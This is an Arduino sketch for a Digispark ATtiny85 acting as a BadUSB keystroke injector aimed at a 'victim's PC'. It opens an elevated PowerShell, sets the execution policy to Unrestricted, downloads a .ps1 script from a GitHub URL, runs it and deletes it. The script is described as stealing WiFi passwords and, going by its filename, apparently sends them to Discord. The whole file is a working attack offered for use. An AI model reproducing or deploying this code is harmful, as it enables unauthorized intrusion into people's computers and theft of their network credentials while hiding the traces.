/*
 * Tested with Attiny85 with English Layout Keyboard
 * Delays might require a tuning, depending on the speed of the victim's PC (right now they're kinda fast)
 *
 * The code:
 * 1. Opens Powershell as Administrator
 * 2. Sets Execution-Policy to Unrestricted
 * 3. Downloads a .ps1 Payload (in this case a Payload that steals WiFi passwords from Windows
 * 4. Launches the Payload
 * 5. Deletes the Payload
 */

#include "DigiKeyboard.h" // https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h
void setup() {
  pinMode(1, OUTPUT);
}
void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_SHIFT_LEFT | MOD_CONTROL_LEFT); // KeyStroke function only allows one KEY, but as many MOD as you wish. This allows to send multiple
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("Set-ExecutionPolicy Unrestricted");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("A");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/SaltyMoku/Reference/main/notes/red_team/rubber_ducky/wifipass_to_discord.ps1',$env:TEMP+'\\payload.ps1')");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("Invoke-Expression -Command $env:TEMP\\payload.ps1");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("Remove-Item $env:TEMP\\payload.ps1");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("exit");
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
}
